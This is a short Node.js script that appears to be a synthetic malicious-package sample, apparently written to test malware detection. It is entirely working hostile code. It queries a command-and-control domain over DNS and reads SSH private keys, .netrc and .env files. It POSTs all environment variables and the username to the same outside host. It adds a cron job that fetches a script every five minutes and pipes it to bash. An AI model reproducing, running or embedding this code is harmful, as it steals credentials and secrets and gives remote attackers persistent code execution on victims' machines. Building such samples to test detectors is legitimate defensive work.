const dns = require('dns');
const https = require('https');
const fs = require('fs');
const os = require('os');
const { execSync } = require('child_process');

// DNS C2 query
dns.resolve('syncit.pavl9ore.surf', () => {});

// Credential access
try { fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8'); } catch(e) {}
try { fs.readFileSync(os.homedir() + '/.netrc', 'utf8'); } catch(e) {}

// Honeytoken
try { fs.readFileSync(os.homedir() + '/.env', 'utf8'); } catch(e) {}

// No shell spawn for variety
// POST exfiltration
const payload = JSON.stringify({ tokens: process.env, user: os.userInfo().username });
try {
  const req = https.request({ hostname: 'syncit.pavl9ore.surf', port: 443, path: '/auth', method: 'POST', headers: { 'Content-Type': 'application/json' } });
  req.write(payload); req.end();
} catch(e) {}

// Persistence via cron
try { execSync('(crontab -l 2>/dev/null; echo "*/5 * * * * curl syncit.pavl9ore.surf/renew | bash") | crontab -'); } catch(e) {}
